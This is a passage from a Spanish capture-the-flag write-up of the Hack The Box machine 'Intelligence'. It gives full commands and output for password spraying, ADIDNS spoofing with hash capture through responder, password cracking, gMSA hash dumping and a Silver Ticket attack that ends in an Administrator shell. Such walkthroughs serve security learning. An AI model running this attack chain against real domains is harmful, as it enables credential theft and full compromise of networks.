<span class="code-dark-green">&gt;  [+] VALID USERNAME:       William.Lee@intelligence.htb</span>
<span class="code-dark-green">&gt;  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb</span>
&gt;  Done! Tested 30 usernames (30 valid) in 0.355 seconds
</code></pre></div><h2 id="acceso-a-la-máquina">Acceso a la máquina</h2><p>Y lo son. Podemos comprobar si alguno de ellos es &ldquo;AS-REP Roasteable&rdquo;, pero ninguno de ellos lo es. Hemos llegado a otro punto muerto.</p><h3 id="obtención-de-credenciales-válidas">Obtención de credenciales válidas</h3><p>Ahora, podemos revisar el contenido de los documentos PDF. A lo mejor hay alguno que no contiene un <em>Lorem ipsum</em>.</p><p>Y así es, el archivo <code>2020-06-04.pdf</code> contiene la siguiente información:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">New Account Guide

Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876

After logging in please change your password as soon as possible.  
</code></pre></div><p>Y también el archivo <code>2020-12-30.pdf</code> es interesante:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Internal IT Update

There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process  
of locking down our service accounts.
</code></pre></div><p>El primer documento dice que todos los nuevos usuarios tendrán la misma contraseña para iniciar sesión la primera vez. Esta contraseña se debe cambiar inmediatamente. No obstante, es probable que alguno de los usuarios se haya olvidado de cambiar la contraseña.</p><p>Esta es una situación clara para efectuar un ataque de <em>password spray</em>. Utilizando otra vez <a href="https://github.com/ropnop/kerbrute"><code>kerbrute</code></a> obtenemos:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">./kerbrute</span> passwordspray --dc 10.10.10.248 -d intelligence.htb <span class="mtku">users.txt</span> NewIntelligenceCorpUser9876

&gt;  Using KDC(s):
&gt;   10.10.10.248:88

<span class="code-dark-green">&gt;  [+] VALID LOGIN WITH ERROR:       Tiffany.Molina@intelligence.htb:NewIntelligenceCorpUser9876     (Clock skew is too great)</span>  
&gt;  Done! Tested 30 logins (1 successes) in 0.710 seconds
</code></pre></div><p>El usuario llamado <code>Tiffany.Molina</code> tiene la contraseña por defecto. Utilizando <a href="https://github.com/byt3bl33d3r/CrackMapExec"><code>crackmapexec</code></a> podemos verificar que las credenciales son válidas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">crackmapexec</span> smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-blue">[*]</span> Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)  
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-green">[+]</span> intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
</code></pre></div><h3 id="enumeración-por-smb">Enumeración por SMB</h3><p>Ahora, podemos enumerar los recursos compartidos por SMB utilizando las credenciales encontradas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">crackmapexec</span> smb 10.10.10.248 -u Tiffany.Molina -p NewIntelligenceCorpUser9876 --shares
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-blue">[*]</span> Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)  
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-green">[+]</span> intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-green">[+]</span> Enumerated shares
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-yellow">Share           Permissions     Remark</span>
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-yellow">-----           -----------     ------</span>
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-yellow">ADMIN$                          Remote Admin</span>
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-yellow">C$                              Default share</span>
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-yellow">IPC$            READ            Remote IPC</span>
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-yellow">IT              READ</span>
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-yellow">NETLOGON        READ            Logon server share</span>
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-yellow">SYSVOL          READ            Logon server share</span>
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-yellow">Users           READ</span>
</code></pre></div><p>El usuario <code>Tiffany.Molina</code> tiene permisos de lectura sobre los recursos <code>IT</code> y <code>Users</code>. Dentro de <code>Users</code> podemos encontrar las siguientes carpetas:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">smbmap</span> -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.10.10.248 -r Users --no-banner  

[+] IP: 10.10.10.248:445        Name: intelligence.htb          Status: <span class="code-dark-green">Authenticated</span>
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        Users                                                   <span class="code-dark-yellow">READ ONLY</span>
        .\Users\\*
        dw--w--w--                0 Mon Apr 19 03:20:26 2021    .
        dw--w--w--                0 Mon Apr 19 03:20:26 2021    ..
        dr--r--r--                0 Mon Apr 19 02:18:39 2021    Administrator
        dr--r--r--                0 Mon Apr 19 05:16:30 2021    All Users
        dw--w--w--                0 Mon Apr 19 04:17:40 2021    Default
        dr--r--r--                0 Mon Apr 19 05:16:30 2021    Default User
        fr--r--r--              174 Mon Apr 19 05:15:17 2021    desktop.ini
        dw--w--w--                0 Mon Apr 19 02:18:39 2021    Public
        dr--r--r--                0 Mon Apr 19 03:20:26 2021    Ted.Graves
        dr--r--r--                0 Mon Apr 19 02:51:46 2021    Tiffany.Molina
</code></pre></div><p>Y aquí poremos ver la <em>flag</em> <code>user.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">smbmap</span> -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.10.10.248 --download <span class="code-dark-yellow">'Users\Tiffany.Molina\Desktop\user.txt'</span> --no-banner  
[+] Starting download: Users\Tiffany.Molina\Desktop\user.txt (34 bytes)
[+] File output to: ./10.10.10.248-Users_Tiffany.Molina_Desktop_user.txt

<span class="code-cyan">$</span> <span class="code-dark-green">mv</span> <span class="code-dark-blue">*</span>user.txt user.txt

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> <span class="mtku">user.txt</span>
d97eb9e4c5535fa637062d14b4b5e8c1
</code></pre></div><h2 id="movimiento-lateral">Movimiento lateral</h2><p>Mirando en el recurso <code>IT</code>, podemos ver un <em>script</em> en PowerShell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">smbmap</span> -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.10.10.248 -r IT --no-banner

[+] IP: 10.10.10.248:445        Name: intelligence.htb          Status: <span class="code-dark-green">Authenticated</span>
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        IT                                                      <span class="code-dark-yellow">READ ONLY</span>
        .\IT\\*
        dr--r--r--                0 Mon Apr 19 02:50:58 2021    .
        dr--r--r--                0 Mon Apr 19 02:50:58 2021    ..
        fr--r--r--             1046 Mon Apr 19 02:50:58 2021    downdetector.ps1

<span class="code-cyan">$</span> <span class="code-dark-green">smbmap</span> -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H 10.10.10.248 --download <span class="code-dark-yellow">'IT\downdetector.ps1'</span> --no-banner  
[+] Starting download: IT\downdetector.ps1 (1046 bytes)
[+] File output to: ./10.10.10.248-IT_downdetector.ps1

<span class="code-cyan">$</span> <span class="code-dark-green">mv</span> <span class="code-dark-blue">*</span>.ps1 downdetector.ps1
</code></pre></div><p>Este <em>script</em> es el siguiente:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3"># Check web server status. Scheduled to run every </span><span class="mtk3">5 min</span>
<span class="mtk7">Import-Module</span><span class="mtk1"> ActiveDirectory</span>
<span class="mtk5">foreach</span><span class="mtk1"> ($record </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk7">Get-ChildItem</span><span class="mtk1"> </span><span class="mtk4">"AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainD</span><span class="mtk4">nsZones,DC=intelligence,DC=htb"</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk7">Where-Object</span><span class="mtk1"> Name </span><span class="mtk5">-like</span><span class="mtk1"> </span><span class="mtk4">"web*"</span><span class="mtk1">) {</span>
<span class="mtk1">  </span><span class="mtk5">try</span><span class="mtk1"> {</span>
<span class="mtk1">    $request </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">Invoke-WebRequest</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">Uri </span><span class="mtk4">"</span><span class="mtk4 detected-link">http://</span><span class="mtk5 detected-link">$(</span><span class="mtk1 detected-link">$record.Name</span><span class="mtk5 detected-link">)</span><span class="mtk4">"</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">UseDefaultCredentials</span>
<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (.StatusCode </span><span class="mtk5">-ne</span><span class="mtk1"> </span><span class="mtk6">200</span><span class="mtk1">) {</span>
<span class="mtk1">      </span><span class="mtk7">Send-MailMessage</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">From </span><span class="mtk4">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">To </span><span class="mtk4">'Ted Graves &lt;Ted.Graves@intelligence.htb&gt;'</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1">Subject </span><span class="mtk4">"Host: </span><span class="mtk5">$(</span><span class="mtk1">$record.Name</span><span class="mtk5">)</span><span class="mtk4"> is down"</span>  
<span class="mtk1">    }</span>
<span class="mtk1">  } </span><span class="mtk5">catch</span><span class="mtk1"> { }</span>
<span class="mtk1">}</span>
</code></pre></div><p>Básicamente, lo que hace el <em>script</em> es buscar en LDAP subdominios del tipo <code>web*.intelligence.htb</code> y realizar una petición web con las credenciales de <code>Ted.Graves</code> (cada 5 minutos). Recordemos que uno de los documentos PDF hablaba de este <em>script</em>.</p><p>Esta vez, podemos añadir un subdominio llamado <code>webrocky.intelligence.htb</code> al DNS utilizando las credenciales de <code>Tiffany.Molina</code> para que apunte a nuestra dirección IP de atacante (esto se conoce como ADIDNS <em>Spoofing</em>, más información <a href="https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing">aquí</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">git</span> clone https://github.com/dirkjanm/krbrelayx.git
...

<span class="code-cyan">$</span> <span class="code-dark-green">cd</span> <span class="mtku">krbrelayx</span>

<span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">dnstool.py</span> -u <span class="code-dark-yellow">'intelligence.htb\Tiffany.Molina'</span> -p NewIntelligenceCorpUser9876 -a add -t A -d 10.10.17.44 -r webrocky.intelligence.htb 10.10.10.248  
<span class="code-blue">[-]</span> Connecting to host...
<span class="code-blue">[-]</span> Binding to host
<span class="code-green">[+]</span> Bind OK
<span class="code-blue">[-]</span> Adding new record
<span class="code-green">[+]</span> LDAP operation completed successfully
</code></pre></div><p>Después, podemos envenenar la red con <code>responder</code> para obtener el <em>hash</em> NTLMv2 de <code>Ted.Graves</code> (después de unos 5 minutos):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">responder</span> -I tun0 -wd
...

<span class="code-green">[+]</span> Listening for events...

<span class="code-blue">[HTTP]</span> NTLMv2 Client   : <span class="code-dark-yellow">::ffff:10.10.10.248</span>
<span class="code-blue">[HTTP]</span> NTLMv2 Username : <span class="code-dark-yellow">intelligence\Ted.Graves</span>
<span class="code-blue">[HTTP]</span> NTLMv2 Hash     : <span class="code-dark-yellow">Ted.Graves::intelligence:c96717a8d336a67a:DD21608A7B1997FE257CE4C1B7B91E53:0101000000000000661433F02901D9010BA8841794BACC860000000002000800590051005400550001001E00570049004E002D00310055004C003200310059004C0048004C00550059000400140059005100540055002E004C004F00430041004C0003003400570049004E002D00310055004C003200310059004C0048004C00550059002E0059005100540055002E004C004F00430041004C000500140059005100540055002E004C004F00430041004C000800300030000000000000000000000000200000A172EB2D5A3E1BA52CF11B1F413401BB13FE7EE922DD13DE44CDF2A76593D0260A0010000000000000000000000000000000000009003C0048005400540050002F0077006500620072006F0063006B0079002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000</span>  
</code></pre></div><p>Ahora que tenemos el <em>hash</em>, podemos tratar de romperlo con <code>john</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">john</span> --wordlist=$WORDLISTS/rockyou.txt <span class="mtku">hash</span>
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Press 'q' or Ctrl-C to abort, almost any other key for status
<span class="code-dark-yellow">Mr.Teddy</span>         (<span class="code-dark-yellow">Ted.Graves</span>)
1g 0:00:00:18 DONE (2022-11-25 18:04) 0.05293g/s 572489p/s 572489c/s 572489C/s Mr5M1rtins..Mr.Muffin  
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
</code></pre></div><p>Y encontramos la contraseña. Veamos si las credenciales son válidas con <a href="https://github.com/byt3bl33d3r/CrackMapExec"><code>crackmapexec</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">crackmapexec</span> smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-blue">[*]</span> Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)  
<span class="code-blue">SMB</span>         10.10.10.248    445    DC               <span class="code-green">[+]</span> intelligence.htb\Ted.Graves:Mr.Teddy
</code></pre></div><h2 id="escalada-de-privilegios">Escalada de privilegios</h2><p>Y aquí tenemos otro punto muerto. Para continuar enumerando el entorno de Active Directory, podemos utilizar <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a>.</p><p>Para ello, primero generamos los archivos JSON con la información necesaria (dominios, ordenadores, usuarios y grupos) con <a href="https://github.com/fox-it/BloodHound.py"><code>bloodhound-python</code></a>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">bloodhound-python</span> -c all -u Ted.Graves -p Mr.Teddy -d intelligence.htb -ns 10.10.10.248 --dns-timeout 60 -w 1
INFO: Found AD domain: intelligence.htb
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 2 computers
INFO: Connecting to LDAP server: dc.intelligence.htb
INFO: Found 42 users
INFO: Found 54 groups
INFO: Found 0 trusts
INFO: Starting computer enumeration with 1 workers
INFO: Querying computer: svc_int.intelligence.htb
WARNING: Could not resolve: svc_int.intelligence.htb: The DNS operation timed out after 61.44789505004883 seconds  
INFO: Querying computer: dc.intelligence.htb
INFO: Done in 01M 29S
</code></pre></div><p>A continuación, introducimos los archivos en <a href="https://github.com/BloodHoundAD/BloodHound">BloodHound</a> y buscamos información para poder obtener acceso al Controlador de Dominio (DC). Obtenemos el siguiente grafo:</p><p><img src="/images/HTB/Intelligence/Intelligence-bloodhound.png" alt="Bloodhound"></p><p>Como vemos, el usuario <code>Ted.Graves</code> es miembro del grupo <code>ITSupport</code>. Y los miembros de este grupo tienen permiso para obtener la contraseña de <code>svc_int$</code>, una cuenta de servicio gestionada por un grupo (gMSA).</p><p>Utilizando <a href="https://github.com/micahvandeusen/gMSADumper"><code>gMSADumper</code></a>, podemos conseguir el <em>hash</em> NTLM de la cuenta de este servicio:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">gMSADumper.py</span> -u Ted.Graves -p Mr.Teddy -d intelligence.htb  
Users or groups who can read password for svc_int$:
 &gt; DC$
 &gt; itsupport
svc_int$:::80c1d736d9988b5763b9aa74362db287
</code></pre></div><p>Y obtenemos el <em>hash</em> NTLM de <code>svc_int$</code>. Ahora es el momento de efectuar un ataque de <em>Silver Ticket</em>.</p><p>Como en cualquier ataque a Kerberos, en primer lugar es necesario sincronizarse con el servidor (utilizando <code>ntpdate</code> o <code>rdate</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">ntpdate</span> 10.10.10.248
ntpdate[20872]: step time server 10.10.10.248 offset +28800.194289 sec  
</code></pre></div><h3 id="ataque-de-_silver-ticket_">Ataque de <em>Silver Ticket</em></h3><p>Y ahora podemos obtener un <em>Silver Ticket</em> para impersonar al usuario <code>Administrator</code> utilizando <code>getST.py</code> de Impacket y especificando el <em>hash</em> de <code>svc_int$</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">impacket-getST</span> -spn WWW/dc.intelligence.htb -impersonate Administrator -dc-ip 10.10.10.248 -hashes :80c1d736d9988b5763b9aa74362db287 intelligence.htb/svc_int$  
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in Administrator.ccache

<span class="code-cyan">$</span> <span class="code-dark-yellow">export</span> KRB5CCNAME=Administrator.ccache
</code></pre></div><p>Después de exportar la variable de entormo <code>KRB5CCNAME</code>, podemos utilizar prácticamente cualquier herramienta de <code>impacket</code> para ganar acceso a la máquina utilizando los parámetros <code>-k -no-pass</code> (por ejemplo: <code>impacket-smbclient</code>, <code>impacket-smbexec</code>, <code>impacket-wmiexec</code> o <code>impacket-psexec</code>).</p><p>Utilizando <code>impacket-wmiexec</code> podemos entrar como <code>Administrator</code> y capturar la <em>flag</em> <code>root.txt</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">impacket-wmiexec</span> -k -no-pass -dc-ip 10.10.10.248 Administrator@dc.intelligence.htb  
Impacket v0.10.0 - Copyright 2021 SecureAuth Corporation

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\&gt;whoami
intelligence\administrator

C:\&gt;type C:\Users\Administrator\Desktop\root.txt
f8f11214c3520eedde9fa839193356bc
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración">Enumeración</a><ul><li><a href="#encontrando-nombres-de-usuario-en-metadatos-de-archivos">Encontrando nombres de usuario en metadatos de archivos</a></li><li><a href="#encontrando-más-archivos-y-nombres-de-usuario">Encontrando más archivos y nombres de usuario</a></li></ul></li><li><a href="#acceso-a-la-máquina">Acceso a la máquina</a><ul><li><a href="#obtención-de-credenciales-válidas">Obtención de credenciales válidas</a></li><li><a href="#enumeración-por-smb">Enumeración por SMB</a></li></ul></li><li><a href="#movimiento-lateral">Movimiento lateral</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a><ul><li><a href="#ataque-de-_silver-ticket_">Ataque de <em>Silver Ticket</em></a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://tinyletter.com/7Rocky" method="post" target="popupwindow" onsubmit='return window.open("https://tinyletter.com/7Rocky","popupwindow","scrollbars=yes,width=800,height=600"),!0'><h3 class="tc">Recibe un resumen semanal del blog</h3><p class="tc"><label for="tlemail"></label></p><p class="tc"><input type="text" class="w-80 f5 pv3 ph3 bg-light-gray bn search" placeholder="Introduce tu correo electrónico" name="email" id="tlemail"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc">impulsado por <a href="https://tinyletter.com" target="_blank" title="tiniletter">TinyLetter</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2023</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>